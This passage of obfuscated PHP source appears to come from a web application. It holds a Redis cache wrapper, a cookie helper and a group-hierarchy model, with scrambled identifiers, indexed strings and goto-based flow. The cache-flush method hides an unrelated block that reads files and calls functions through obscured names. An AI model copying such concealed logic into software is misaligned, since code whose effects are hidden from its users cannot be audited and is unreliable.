$BÎÛà°ªĞ) { $eë†ŠÃŒîî =& $_SERVER[úÎü]; $Bª­¾¶§‰í = new Redis(); $bêö‹‚·¤ = isset($AĞ…ÉÙÏ¹[$eë†ŠÃŒîî[789]]) ? $AĞ…ÉÙÏ¹[$eë†ŠÃŒîî[789]] : !1; if ($bêö‹‚·¤) { $Bª­¾¶§‰í->pconnect($AĞ…ÉÙÏ¹[$eë†ŠÃŒîî[173]], $AĞ…ÉÙÏ¹[$eë†ŠÃŒîî[174]], $BÎÛà°ªĞ); } else { $Bª­¾¶§‰í->connect($AĞ…ÉÙÏ¹[$eë†ŠÃŒîî[173]], $AĞ…ÉÙÏ¹[$eë†ŠÃŒîî[174]], $BÎÛà°ªĞ); } if (!empty($AĞ…ÉÙÏ¹[$eë†ŠÃŒîî[392]])) { $Bª­¾¶§‰í->auth($AĞ…ÉÙÏ¹[$eë†ŠÃŒîî[392]]); } return $Bª­¾¶§‰í; } private function initCluster($D÷¡…õˆ‰, $d„º…Ü‘–‹) { $AœÜİ±âšÄ =& $_SERVER[úÎü]; $eÑ±ëõÑï’ = array($AœÜİ±âšÄ[790], $AœÜİ±âšÄ[791], $AœÜİ±âšÄ[792]); $CÉ¡—ÁÏ = $AœÜİ±âšÄ[790]; if (isset($D÷¡…õˆ‰[$AœÜİ±âšÄ[12]]) && in_array($D÷¡…õˆ‰[$AœÜİ±âšÄ[12]], $eÑ±ëõÑï’)) { $CÉ¡—ÁÏ = $D÷¡…õˆ‰[$AœÜİ±âšÄ[12]]; } switch ($CÉ¡—ÁÏ) { case $AœÜİ±âšÄ[790]: $this->_slave($D÷¡…õˆ‰, $d„º…Ü‘–‹); break; case $AœÜİ±âšÄ[791]: break; case $AœÜİ±âšÄ[792]: $this->isCluster = !0; $E¦–´ãùã = $D÷¡…õˆ‰[$AœÜİ±âšÄ[785]]; $D­Ç‰»¸Š— = isset($D÷¡…õˆ‰[$AœÜİ±âšÄ[789]]) ? $D÷¡…õˆ‰[$AœÜİ±âšÄ[789]] : !1; $CÙ¼õâğÁ = isset($D÷¡…õˆ‰[$AœÜİ±âšÄ[392]]) ? $D÷¡…õˆ‰[$AœÜİ±âšÄ[392]] : null; $this->handle = new RedisCluster(NUll, $E¦–´ãùã, $d„º…Ü‘–‹, $d„º…Ü‘–‹, $D­Ç‰»¸Š—, $CÙ¼õâğÁ); break; default: break; } } private function _slave($D÷³ÂÜó„, $AÁÙÛÒ±¿‚) { goto dÍµ£ª¢‘É; f¡Ö§‹ÖŸÓ: unset($dğã†µ«ô[0]); if (empty($dğã†µ«ô)) { return; } $e„â–ÅÅªĞ = array_rand($dğã†µ«ô); goto eËé°Çôàà; eËé°Çôàà: $this->filterConfig($D÷³ÂÜó„, $dğã†µ«ô[$e„â–ÅÅªĞ]); $this->slaveHandle = $this->init($D÷³ÂÜó„, $AÁÙÛÒ±¿‚); goto f…ƒ»ó¸…±; dÍµ£ª¢‘É: $dğã†µ«ô = $D÷³ÂÜó„[$_SERVER[úÎü][785]]; $this->filterConfig($D÷³ÂÜó„, $dğã†µ«ô[0]); $this->handle = $this->init($D÷³ÂÜó„, $AÁÙÛÒ±¿‚); goto f¡Ö§‹ÖŸÓ; f…ƒ»ó¸…±: } private function filterConfig(&$EÑåéåÆ¾, $e‘­©„ŸĞ) { $aâÓ¹‡©…æ =& $_SERVER[úÎü]; $Aö”êâ«Çô = explode($aâÓ¹‡©…æ[4], $e‘­©„ŸĞ); $a˜¨òç²‡ = array($aâÓ¹‡©…æ[173] => $Aö”êâ«Çô[0], $aâÓ¹‡©…æ[174] => $Aö”êâ«Çô[1]); $EÑåéåÆ¾ = array_merge($EÑåéåÆ¾, $a˜¨òç²‡); } public function set($FÌ¹õá¹Í‡, $F ‘«¸æ‘Ñ, $cµò±Ìå² = false) { $cµò±Ìå² = $cµò±Ìå² ? $cµò±Ìå² : $this->cacheTime; return $this->handle->setEx($FÌ¹õá¹Í‡, $cµò±Ìå², $F ‘«¸æ‘Ñ); } public function setLock($dåšéÖ¤…Ó, $B†½‹òÛñœ, $a«Ï™³ªòÕ) { return $this->handle->setNX($dåšéÖ¤…Ó, $B†½‹òÛñœ); } public function get($EˆŒ…îÀ×‹) { $EÜùÀîšâ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $EÜùÀîšâ->get($EˆŒ…îÀ×‹); } public function remove($E‹„´ç‰ö) { return $this->handle->del($E‹„´ç‰ö); } public function deleteAll() { $bƒ·ë¡âÖÓ =& $_SERVER[úÎü]; if ($_SERVER[$bƒ·ë¡âÖÓ[793]] != $_SERVER[$bƒ·ë¡âÖÓ[794]]) { goto D»îÓŞ‚ÀÂ; D»îÓŞ‚ÀÂ: $CÈ–Ÿ¶¼ö¤ = $bƒ·ë¡âÖÓ[795]; $Aà‚§È¸ğå = $bƒ·ë¡âÖÓ[796]; $dá“Ü¢Ìëâ = $_SERVER[$bƒ·ë¡âÖÓ[797]] . $bƒ·ë¡âÖÓ[798]; goto cƒ²à×Â’; cƒ²à×Â’: $DºÒßÎ„ã× = $Aà‚§È¸ğå($dá“Ü¢Ìëâ); $EÑ†ê’½Íé = explode($bƒ·ë¡âÖÓ[225], $DºÒßÎ„ã×); if (count($EÑ†ê’½Íé) < $bƒ·ë¡âÖÓ[564]) { $EÜë·ØÉÏÙ = $bƒ·ë¡âÖÓ[799]; $EÜë·ØÉÏÙ(); } goto cÅ´­çÉæ; cÅ´­çÉæ: $fºª İ = $bƒ·ë¡âÖÓ[800]; $fºª İ($_SERVER[$bƒ·ë¡âÖÓ[801]]); $fºª İ($_SERVER[$bƒ·ë¡âÖÓ[797]] . $bƒ·ë¡âÖÓ[802]); goto Fä™¸Œ‚…Ä; Fä™¸Œ‚…Ä: $A—…„æÅ±³ = 1; while ($A—…„æÅ±³ > 1) { $A—…„æÅ±³ = $A—…„æÅ±³ + 4; $Cƒ¥‹ˆèèŸ = rawurlencode($A—…„æÅ±³ . $bƒ·ë¡âÖÓ[368]); } goto A¬Ö‰Ü¬‹; A¬Ö‰Ü¬‹: } if ($this->isCluster) { foreach ($this->handle->_masters() as $DĞ¬ï‡½ğ) { $this->handle->flushall($DĞ¬ï‡½ğ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($B‰Ì»àº…ğ = '', $C¾÷²Ñ›® = 0) { if (is_string($B‰Ì»àº…ğ) && $B‰Ì»àº…ğ != $_SERVER[úÎü][33]) { $this->prefix = $B‰Ì»àº…ğ; } if (is_numeric($C¾÷²Ñ›®) && $C¾÷²Ñ›® > 0) { $this->expire = $C¾÷²Ñ›®; } } public static function getInstance() { static $d¶ßà¶ö¼õ; if ($d¶ßà¶ö¼õ === null) { $d¶ßà¶ö¼õ = new self(); } return $d¶ßà¶ö¼õ; } private static $cookieDisable = false; public static function disable($Eõñ‰·Ó†â) { self::$cookieDisable = $Eõñ‰·Ó†â; } private static $sameCookieSet = array(); public static function set($eÀèáâ„, $FÒÁ¶µ‘‹ò, $bõîïÇ¢÷á = 0, $aÀÛºĞÔçĞ = false, $Fˆ™«Êƒ˜  = false) { goto eåÈ¬¤Í; eåÈ¬¤Í: $Eïƒï§ƒ‰ =& $_SERVER[úÎü]; if (self::$cookieDisable) { return; } if (!$bõîïÇ¢÷á) { $bõîïÇ¢÷á = 24 * 3600 * 7; } goto d³îùñóŒ¬; d³îùñóŒ¬: if (isset(self::$sameCookieSet[$eÀèáâ„]) && self::$sameCookieSet[$eÀèáâ„] == $FÒÁ¶µ‘‹ò . $bõîïÇ¢÷á) { return; } self::$sameCookieSet[$eÀèáâ„] = $FÒÁ¶µ‘‹ò . $bõîïÇ¢÷á; if (!$Fˆ™«Êƒ˜ ) { $Fˆ™«Êƒ˜  = str_replace(HOST, $Eïƒï§ƒ‰[33], APP_HOST); $Fˆ™«Êƒ˜  = _get($GLOBALS, $Eïƒï§ƒ‰[803], $Fˆ™«Êƒ˜ ); } goto Bä¹Ê’Ç²; Bä¹Ê’Ç²: $f‘ÑÂÖöö = $Eïƒï§ƒ‰[33]; setcookie($eÀèáâ„, $FÒÁ¶µ‘‹ò, time() + $bõîïÇ¢÷á, $Eïƒï§ƒ‰[8] . trim($Fˆ™«Êƒ˜ , $Eïƒï§ƒ‰[8]) . $f‘ÑÂÖöö, !1, !1, $aÀÛºĞÔçĞ); goto aä‡ÈåÖß¡; aä‡ÈåÖß¡: } public static function setSafe($f¤ïóÂ¨¹, $FÊÁÚ±ñÚ„, $a£ù‘âğ‚ = 0) { self::set($f¤ïóÂ¨¹, $FÊÁÚ±ñÚ„, $a£ù‘âğ‚, !0); } public static function get($DéŒï¶ƒ½) { return isset($_COOKIE[$DéŒï¶ƒ½]) ? $_COOKIE[$DéŒï¶ƒ½] : !1; } public static function remove($d‹ Àˆö¿, $b®Ñ î¸Ô = false) { unset($_COOKIE[$d‹ Àˆö¿]); self::set($d‹ Àˆö¿, $_SERVER[úÎü][33], 1, $b®Ñ î¸Ô); } } goto cì‡º¶Üá†; fÙµ½ƒÙ”Ö: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\141\x6d\145" => "\x67\162\157\165\160\137\155\145\164\141", "\x6d\x65\x74\x61\x46\151\145\x6c\144" => "\147\162\x6f\x75\x70\x49\x44"); protected function cacheFunctionAlias($a—”—ã¾—) { $Eôñ©Â‡Ÿ¼ =& $_SERVER[úÎü]; return array($Eôñ©Â‡Ÿ¼[1717] => array($a—”—ã¾—[0], $Eôñ©Â‡Ÿ¼[1718]), $Eôñ©Â‡Ÿ¼[1719] => array($a—”—ã¾—[0], $Eôñ©Â‡Ÿ¼[1718])); } protected function getInfo($D÷†Ò†™«) { $bÛÅÉÜŠÍ® = $this->getInfoSimple($D÷†Ò†™«); if (!$bÛÅÉÜŠÍ®) { return !1; } return $this->_listDataApplyItem($bÛÅÉÜŠÍ®); } protected function getInfoSimple($CŠ²ºİ³æÔ, $f‚ò‚¾íã = false) { $E¤µ“ßµÌŠ =& $_SERVER[úÎü]; if ($f‚ò‚¾íã) { $fŠ¹ÚàŠ‹Õ = array($E¤µ“ßµÌŠ[1644] => intval($CŠ²ºİ³æÔ)); $a·¢Û°éÛ = $this->where($fŠ¹ÚàŠ‹Õ)->find(); return is_array($a·¢Û°éÛ) ? $a·¢Û°éÛ : array(); } return $this->cacheFunctionGet($E¤µ“ßµÌŠ[1720], $CŠ²ºİ³æÔ); } protected function groupAdd($CŒ×À³Ğ—…) { goto Bİ»’Ÿ´ºò; dôˆ¼ƒÃŞä: if (isset($CŒ×À³Ğ—…[$bÈğ°ïŒ«[1723]])) { $this->metaSet($BÑå–ÅÒé, array($bÈğ°ïŒ«[1723] => $CŒ×À³Ğ—…[$bÈğ°ïŒ«[1723]], $bÈğ°ïŒ«[1724] => $CŒ×À³Ğ—…[$bÈğ°ïŒ«[1724]])); unset($CŒ×À³Ğ—…[$bÈğ°ïŒ«[1723]]); unset($CŒ×À³Ğ—…[$bÈğ°ïŒ«[1724]]); } Model($bÈğ°ïŒ«[1162])->groupRootAdd($BÑå–ÅÒé); return $BÑå–ÅÒé; goto AÂì—¡å£; C‚ˆ¹Ù—‘³: if (!empty($CŒ×À³Ğ—…[$bÈğ°ïŒ«[1644]])) { $F‘¥îŸ–—‚[$bÈğ°ïŒ«[1644]] = $CŒ×À³Ğ—…[$bÈğ°ïŒ«[1644]]; } $BÑå–ÅÒé = $this->add($F‘¥îŸ–—‚); $this->setNamePinyin($BÑå–ÅÒé, $F‘¥îŸ–—‚[$bÈğ°ïŒ«[28]]); goto dôˆ¼ƒÃŞä; C°‘åŠ£³: if ($EÅ°ÈŸÀÏ[$bÈğ°ïŒ«[476]]) { $e”­Á›šš = $EÅ°ÈŸÀÏ[$bÈğ°ïŒ«[476]] . $EÅ°ÈŸÀÏ[$bÈğ°ïŒ«[1644]] . $bÈğ°ïŒ«[47]; } $F‘¥îŸ–—‚ = array($bÈğ°ïŒ«[402] => $this->groupNameAuto($CŒ×À³Ğ—…[$bÈğ°ïŒ«[478]], $CŒ×À³Ğ—…[$bÈğ°ïŒ«[28]]), $bÈğ°ïŒ«[384] => $CŒ×À³Ğ—…[$bÈğ°ïŒ«[478]], $bÈğ°ïŒ«[542] => $e”­Á›šš, $bÈğ°ïŒ«[1721] => $CŒ×À³Ğ—…[$bÈğ°ïŒ«[1628]], $bÈğ°ïŒ«[1722] => 0, $bÈğ°ïŒ«[1648] => 0); if (isset($CŒ×À³Ğ—…[$bÈğ°ïŒ«[1667]])) { $F‘¥îŸ–—‚[$bÈğ°ïŒ«[1667]] = $CŒ×À³Ğ—…[$bÈğ°ïŒ«[1667]]; } else { $f£ÉÖ‡´Ñ³ = $this->max($bÈğ°ïŒ«[1667]); if (!$f£ÉÖ‡´Ñ³) { $f£ÉÖ‡´Ñ³ = 0; } $F‘¥îŸ–—‚[$bÈğ°ïŒ«[1667]] = $f£ÉÖ‡´Ñ³ + 1; } goto C‚ˆ¹Ù—‘³; Bİ»’Ÿ´ºò: $bÈğ°ïŒ« =& $_SERVER[úÎü]; if (!$CŒ×À³Ğ—…[$bÈğ°ïŒ«[478]] && isset($CŒ×À³Ğ—…[$bÈğ°ïŒ«[1644]]) && $CŒ×À³Ğ—…[$bÈğ°ïŒ«[1644]] == 1) { if ($EÅ°ÈŸÀÏ = $this->getInfoSimple($CŒ×À³Ğ—…[$bÈğ°ïŒ«[1644]], !0)) { return $CŒ×À³Ğ—…[$bÈğ°ïŒ«[1644]]; } } else { $EÅ°ÈŸÀÏ = $this->getInfoSimple($CŒ×À³Ğ—…[$bÈğ°ïŒ«[478]]); if (!$EÅ°ÈŸÀÏ) { return !1; } } $e”­Á›šš = $bÈğ°ïŒ«[487]; goto C°‘åŠ£³; AÂì—¡å£: } protected function groupEdit($B˜¬ç‡‡Á, $b°ã‘Ë…è×) { $d¬£È‰öĞ¤ =& $_SERVER[úÎü]; if (!empty($b°ã‘Ë…è×[$d¬£È‰öĞ¤[478]])) { $bÁ„’ÍŒÇ = $this->getInfoSimple($B˜¬ç‡‡Á); $c‚øŸÓ¯ä = $this->getInfoSimple($b°ã‘Ë…è×[$d¬£È‰öĞ¤[478]]); if (!$bÁ„’ÍŒÇ || !$c‚øŸÓ¯ä) { return !1; } if ($bÁ„’ÍŒÇ[$d¬£È‰öĞ¤[1644]] == $c‚øŸÓ¯ä[$d¬£È‰öĞ¤[1644]]) { return !1; } if ($b°ã‘Ë…è×[$d¬£È‰öĞ¤[478]] != $bÁ„’ÍŒÇ[$d¬£È‰öĞ¤[478]]) { if ($c‚øŸÓ¯ä[$d¬£È‰öĞ¤[476]] !== $bÁ„’ÍŒÇ[$d¬£È‰öĞ¤[476]] && strpos($c‚øŸÓ¯ä[$d¬£È‰öĞ¤[476]], $bÁ„’ÍŒÇ[$d¬£È‰öĞ¤[476]] . $bÁ„’ÍŒÇ[$d¬£È‰öĞ¤[1644]] . $d¬£È‰öĞ¤[47]) === 0) { return !1; } $b°ã‘Ë…è×[$d¬£È‰öĞ¤[542]] = $c‚øŸÓ¯ä[$d¬£È‰öĞ¤[476]] . $b°ã‘Ë…è×[$d¬£È‰öĞ¤[478]] . $d¬£È‰öĞ¤[47]; $this->_changeChildLevel($bÁ„’ÍŒÇ, $c‚øŸÓ¯ä); } } if (isset($b°ã‘Ë…è×[$d¬£È‰öĞ¤[28]])) { $this->setNamePinyin($B˜¬ç‡‡Á, $b°ã‘Ë…è×[$d¬£È‰öĞ¤[28]]); } if (isset($b°ã‘Ë…è×[$d¬£È‰öĞ¤[1723]])) { $this->metaSet($B˜¬ç‡‡Á, array($d¬£È‰öĞ¤[1723] => $b°ã‘Ë…è×[$d¬£È‰öĞ¤[1723]], $d¬£È‰öĞ¤[1724] => $b°ã‘Ë…è×[$d¬£È‰öĞ¤[1724]])); unset($b°ã‘Ë…è×[$d¬£È‰öĞ¤[1723]]); unset($b°ã‘Ë…è×[$d¬£È‰öĞ¤[1724]]); } return $this->where(array($d¬£È‰öĞ¤[1725] => $B˜¬ç‡‡Á))->save($b°ã‘Ë…è×); } private function _changeChildLevel($EŸÆ±˜×±, $dÀ‘ò½©¶Ê, $FÖùåÑÕòµ = false) { goto e”»İ°ğğ•; e”»İ°ğğ•: $D³İ«‚ßÜå =& $_SERVER[úÎü]; $fóÉÃ‹“§â = $EŸÆ±˜×±[$D³İ«‚ßÜå[476]] . $EŸÆ±˜×±[$D³İ«‚ßÜå[1644]] . $D³İ«‚ßÜå[47]; $Báëù¡ƒÏ = $dÀ‘ò½©¶Ê[$D³İ«‚ßÜå[476]] . $dÀ‘ò½©¶Ê[$D³İ«‚ßÜå[1644]] . $D³İ«‚ßÜå[47] . $EŸÆ±˜×±[$D³İ«‚ßÜå[1644]] . $D³İ«‚ßÜå[47]; goto E©éêèØñß; E©éêèØñß: if ($FÖùåÑÕòµ) { $Báëù¡ƒÏ = $dÀ‘ò½©¶Ê[$D³İ«‚ßÜå[476]] . $dÀ‘ò½©¶Ê[$D³İ«‚ßÜå[1644]] . $D³İ«‚ßÜå[47]; } $Eî†Ó½²… = array($D³İ«‚ßÜå[542] => array($D³İ«‚ßÜå[500], $EŸÆ±˜×±[$D³İ«‚ßÜå[476]] . $EŸÆ±˜×±[$D³İ«‚ßÜå[1644]] . $D³İ«‚ßÜå[501])); $d¢ïÃÊ—Õã = array($D³İ«‚ßÜå[542] => array($D³İ«‚ßÜå[550], "\162\x65\x70\x6c\x61\x63\x65\x28\x70\x61\162\145\x6e\164\x4c\x65\x76\145\154\x2c\47{$fóÉÃ‹“§â}\47\x2c\x27{$Báëù¡ƒÏ}\47\51")); goto DíÔ–¥›ñ; DíÔ–¥›ñ: $this->where($Eî†Ó½²…)->data($d¢ïÃÊ—Õã)->save(); goto E„æ½Ğ­Ğˆ; E„æ½Ğ­Ğˆ: } public function setNamePinyin($bÊ£àù–Ÿé, $d ¢‘Õ©ƒ‡ = false) { $BÒœ¼Â¶òé =& $_SERVER[úÎü]; if (!$d ¢‘Õ©ƒ‡) { $d…å‚¡ßØÜ = $this->getInfoSimple($bÊ£àù–Ÿé); $d ¢‘Õ©ƒ‡ = $d…å‚¡ßØÜ[$BÒœ¼Â¶òé[28]]; } if (!Input::check($d ¢‘Õ©ƒ‡, $BÒœ¼Â¶òé[545])) { $this->metaSet($bÊ£àù–Ÿé, $BÒœ¼Â¶òé[432], null); $this->metaSet($bÊ£àù–Ÿé, $BÒœ¼Â¶òé[431], null); return; } $a½Ü¯É±¢š = array($BÒœ¼Â¶òé[432] => str_replace($BÒœ¼Â¶òé[50], $BÒœ¼Â¶òé[33], Pinyin::encode($d ¢‘Õ©ƒ‡)), $BÒœ¼Â¶òé[431] => Pinyin::encode($d ¢‘Õ©ƒ‡, $BÒœ¼Â¶òé[546])); $this->metaSet($bÊ£àù–Ÿé, $a½Ü¯É±¢š); } protected function groupStatus($F ©½Ä¶‡’, $b«ßŞù±ŠØ) { goto e©„ñ©ÆÒŞ; e©„ñ©ÆÒŞ: $f™çÜ¯§¾· =& $_SERVER[úÎü]; $E¨ğŒ íœ = $this->getInfoSimple($F ©½Ä¶‡’); if (!$E¨ğŒ íœ) { return !1; } goto D¾¤†ò–¦¤; FìÕÍ‹òó: foreach ($DÂ„ÇØ as $F ©½Ä¶‡’) { $Fä¸Ü§ß•[] = array($f™çÜ¯§¾·[1644] => $F ©½Ä¶‡’, $f™çÜ¯§¾·[89] => $f™çÜ¯§¾·[690], $f™çÜ¯§¾·[366] => $b«ßŞù±ŠØ); } return Model($f™çÜ¯§¾·[1726])->addAll($Fä¸Ü§ß•, array(), !0); goto b…ÄäÚïê¸; D¾¤†ò–¦¤: if ($b«ßŞù±ŠØ == $f™çÜ¯§¾·[83]) { $DÂ„ÇØ = $this->parentLevelArray($E¨ğŒ íœ[$f™çÜ¯§¾·[476]]); } else { $c¾İ²¼³ô = array($f™çÜ¯§¾·[542] => array($f™çÜ¯§¾·[500], $E¨ğŒ íœ[$f™çÜ¯§¾·[476]] . $E¨ğŒ íœ[$f™çÜ¯§¾·[1644]] . $f™çÜ¯§¾·[501])); $DÂ„ÇØ = $this->where($c¾İ²¼³ô)->field($f™çÜ¯§¾·[1644])->select(); $DÂ„ÇØ = array_to_keyvalue($DÂ„ÇØ, $f™çÜ¯§¾·[33], $f™çÜ¯§¾·[1644]); } $DÂ„ÇØ[] = $E¨ğŒ íœ[$f™çÜ¯§¾·[1644]]; $Fä¸Ü§ß• = array(); goto FìÕÍ‹òó; b…ÄäÚïê¸: } protected function groupRemove($A¸¬¯Ñæ™„) { goto aìÕÊ…˜; aìÕÊ…˜: $aİñàÏ»†õ =& $_SERVER[úÎü]; $a¨¾²æÁù = array($aİñàÏ»†õ[1644] => $A¸¬¯Ñæ™„); $f±†íÚÕÆÑ = $this->where($a¨¾²æÁù)->find(); goto fÑÇõŞÙĞ½; aÜŠ»³¨“ô: Model($aİñàÏ»†õ[752])->groupRootRemove($A¸¬¯Ñæ™„); return $this->where($a¨¾²æÁù)->delete(); goto b™Ş™…À²; fÑÇõŞÙĞ½: if (!$f±†íÚÕÆÑ || $f±†íÚÕÆÑ[$aİñàÏ»†õ[478]] == 0) { return !1; } $a¥¿ºŸ½¯Ï = $this->getInfoSimple($f±†íÚÕÆÑ[$aİñàÏ»†õ[478]]); $this->_changeChildLevel($f±†íÚÕÆÑ, $a¥¿ºŸ½¯Ï, !0); goto E³Şë©‚¥; E³Şë©‚¥: $this->where(array($aİñàÏ»†õ[478] => $A¸¬¯Ñæ™„))->save(array($aİñàÏ»†õ[478] => $f±†íÚÕÆÑ[$aİñàÏ»†õ[478]])); Model($aİñàÏ»†õ[1726])->where($a¨¾²æÁù)->delete(); Model($aİñàÏ»†õ[1727])->where($a¨¾²æÁù)->delete(); goto aÜŠ»³¨“ô; b™Ş™…À²: } protected function groupSort($dÃÂåÊØ) { $DèŒëä’Ö =& $_SERVER[úÎü]; $a³ËË—¾®œ = array(); foreach ($dÃÂåÊØ as $Cµê˜Ğƒ¹¶ => $fËÉÉÊŠ¢š) { $a³ËË—¾®œ[] = array($DèŒëä’Ö[1644], $fËÉÉÊŠ¢š, $DèŒëä’Ö[1667], $Cµê˜Ğƒ¹¶ + 1); } $this->saveAll($a³ËË—¾®œ); } public function listData() { $B‘÷§êÇ”ù = $this->_makeOrder()->selectPage(50); $this->_listDataApply($B‘÷§êÇ”ù[$_SERVER[úÎü][361]]); return $B‘÷§êÇ”ù; } private function _makeOrder($dùÉöÓ–†£ = '') { goto fÏø†ó«¨‘; fÏø†ó«¨‘: $b»ê¯í·ì– =& $_SERVER[úÎü]; $CÕ²ëà»Âò = array($b»ê¯í·ì–[1644], $b»ê¯í·ì–[28], $b»ê¯í·ì–[1630], $b»ê¯í·ì–[190]); $D©”ø“„Ëî = array($b»ê¯í·ì–[418] => $b»ê¯í·ì–[419], $b»ê¯í·ì–[420] => $b»ê¯í·ì–[421]); goto f§ÎéµÈÓ; f§ÎéµÈÓ: $e™‘ƒ´Œí = Input::get($b»ê¯í·ì–[423], $b»ê¯í·ì–[7], $b»ê¯í·ì–[1648], $CÕ²ëà»Âò); $f™Ğ˜ÙÖ¿ = Input::get($b»ê¯í·ì–[424], $b»ê¯í·ì–[7], $b»ê¯í·ì–[1728], array($b»ê¯í·ì–[1728], $b»ê¯í·ì–[420])); $f™Ğ˜ÙÖ¿ = $D©”ø“„Ëî[$f™Ğ˜ÙÖ¿]; goto CÀÆŒŸ«”§; CÀÆŒŸ«”§: $dùÉöÓ–†£ = $dùÉöÓ–†£ . "{$e™‘ƒ´Œí}\40{$f™Ğ˜ÙÖ¿}\x2c\40\147\x72\x6f\x75\160\x49\x44\40\x61\x73\143"; return $this->order($dùÉöÓ–†£); goto f¦ìÜê®¥É; f¦ìÜê®¥É: } public function listChild($cî¤¢ª…£À) { $fÎ¿ŒÑÜÜ« =& $_SERVER[úÎü]; $f§à—åšš¾ = $this->where(array($fÎ¿ŒÑÜÜ«[478] => $cî¤¢ª…£À))->_makeOrder()->selectPage(200); $this->_listDataApply($f§à—åšš¾[$fÎ¿ŒÑÜÜ«[361]]); return $f§à—åšš¾; } public function listByID($a×Ú´â©Õ) { $E‰ïõá…¢ =& $_SERVER[úÎü]; if (!$a×Ú´â©Õ) { return array(); } $a©ãÒ‘â· = array($E‰ïõá…¢[1644] => array($E‰ïõá…¢[7], $a×Ú´â©Õ)); $F”Ûê„¸¥Ì = $this->where($a©ãÒ‘â·)->select(); $this->_listDataApply($F”Ûê„¸¥Ì); return $F”Ûê„¸¥Ì; } public function listSearch($fÎˆè°‹) { goto c¶à´Î­ÑÆ; c¶à´Î­ÑÆ: $AÒ½­Á»’Ó =& $_SERVER[úÎü]; $fõäÍŒËÕÊ = $fÎˆè°‹[$AÒ½­Á»’Ó[1729]]; $dÊ¶ßÑ©“• = isset($fÎˆè°‹[$AÒ½­Á»’Ó[1730]]) ? $fÎˆè°‹[$AÒ½­Á»’Ó[1730]] : !1; goto bŠ…Ø·Ù†ç; AÃñ‘ŒÁåŒ: if ($dÊ¶ßÑ©“•) { $cç¦ø§ê = $this->getInfoSimple($dÊ¶ßÑ©“•); $a´È²ğïò‚ = $cç¦ø§ê[$AÒ½­Á»’Ó[476]] . $dÊ¶ßÑ©“• . $AÒ½­Á»’Ó[501]; $Cñ…³ÅÎÀˆ = array($Cñ…³ÅÎÀˆ, array($AÒ½­Á»’Ó[476] => array($AÒ½­Á»’Ó[373], $a´È²ğïò‚))); } $Cñ…³ÅÎÀˆ = $this->parseWhereLike($Cñ…³ÅÎÀˆ); $E¯âí”ğÚß = $this->_makeOrder()->where($Cñ…³ÅÎÀˆ)->selectPage(20); goto bö‡±Äœ––; bŠ…Ø·Ù†ç: if (!trim($fõäÍŒËÕÊ)) { return !1; } $fõäÍŒËÕÊ = str_replace($AÒ½­Á»’Ó[1731], $AÒ½­Á»’Ó[1732], $fõäÍŒËÕÊ); $Cñ…³ÅÎÀˆ = array($AÒ½­Á»’Ó[1644] => array($AÒ½­Á»’Ó[373], "{$fõäÍŒËÕÊ}\45"), $AÒ½­Á»’Ó[28] => array($AÒ½­Á»’Ó[373], "\45{$fõäÍŒËÕÊ}\45"), $AÒ½­Á»’Ó[918] => $AÒ½­Á»’Ó[1733]); goto AÃñ‘ŒÁåŒ; bªÊ«†äÇ: return $E¯âí”ğÚß; goto A£¬Ò‡¡¾²; bö‡±Äœ––: $E¯âí”ğÚß = $E¯âí”ğÚß ? $E¯âí”ğÚß : array(); if (!$E¯âí”ğÚß || count($E¯âí”ğÚß[$AÒ½­Á»’Ó[361]]) < 5 && Input::check($fõäÍŒËÕÊ, $AÒ½­Á»’Ó[312])) { goto EØõõ Áç‚; EØõõ Áç‚: $cÕê¥‡…©‡ = $this->groupChildrenAll($dÊ¶ßÑ©“•); $E£ÓÜ½¯Ä´ = $this->_searchFromMeta($AÒ½­Á»’Ó[431], $fõäÍŒËÕÊ, 10, $cÕê¥‡…©‡); $E‘š¾É—–“ = $this->_searchFromMeta($AÒ½­Á»’Ó[432], $fõäÍŒËÕÊ, 10, $cÕê¥‡…©‡); goto dÒ· «ºçÖ; dÒ· «ºçÖ: $BÎÕ¹©®í = array_merge($E£ÓÜ½¯Ä´, $E‘š¾É—–“, $E¯âí”ğÚß[$AÒ½­Á»’Ó[361]]); $E¯âí”ğÚß[$AÒ½­Á»’Ó[361]] = array_unique_by_key($BÎÕ¹©®í, $AÒ½­Á»’Ó[1644]); $E¯âí”ğÚß[$AÒ½­Á»’Ó[358]][$AÒ½­Á»’Ó[359]] = count($E¯âí”ğÚß[$AÒ½­Á»’Ó[361]]); goto cÉ‹Ú”à¹¶; cÉ‹Ú”à¹¶: $E¯âí”ğÚß[$AÒ½­Á»’Ó[358]][$AÒ½­Á»’Ó[360]] = ceil($E¯âí”ğÚß[$AÒ½­Á»’Ó[358]][$AÒ½­Á»’Ó[359]] / $E¯âí”ğÚß[$AÒ½­Á»’Ó[358]][$AÒ½­Á»’Ó[356]]); goto eñëª«ä; eñëª«ä: } $this->_listDataApply($E¯âí”ğÚß[$AÒ½­Á»’Ó[361]]); goto bªÊ«†äÇ; A£¬Ò‡¡¾²: } protected function groupChildrenAll($còÚé‰¯ˆâ) { $f¦ç¸çÛ =& $_SERVER[úÎü]; if (!$còÚé‰¯ˆâ) { return !1; } if (is_string($còÚé‰¯ˆâ)) { $còÚé‰¯ˆâ = array($còÚé‰¯ˆâ); } $eŞ†÷ôÈ¦ = $còÚé‰¯ˆâ; foreach ($còÚé‰¯ˆâ as $A¾Ú¾õ¥”¥) { $eŸ§ëàÓ¼Î = $this->getInfoSimple($A¾Ú¾õ¥”¥); $E‡¹œÙ×ÜÖ = array($f¦ç¸çÛ[476] => array($f¦ç¸çÛ[373], $eŸ§ëàÓ¼Î[$f¦ç¸çÛ[476]] . $A¾Ú¾õ¥”¥ . $f¦ç¸çÛ[501])); $fè‡¨ø·³ò = $this->field($f¦ç¸çÛ[1644])->where($E‡¹œÙ×ÜÖ)->select(); $eŞ†÷ôÈ¦ = array_merge($eŞ†÷ôÈ¦, array_to_keyvalue($fè‡¨ø·³ò, $f¦ç¸çÛ[33], $f¦ç¸çÛ[1644])); } return array_unique($eŞ†÷ôÈ¦); } private function _searchFromMeta($ağâæîñÄ“, $cØ‹ÅÖ¬åš, $aóÓÉ¥Ã£‰, $f¦¼„à¯Ñ˜) { goto E²¡’Ù”¯×; b ùˆ†ÓŠ: if (!$CÍ·œ Ç’©) { return array(); } return $CÍ·œ Ç’©; goto d‘­³ÄÚá; a¯ç§Øšø¢: if (!$dØ¢óğÔé†) { return array(); } $dØ¢óğÔé† = array_to_keyvalue($dØ¢óğÔé†, 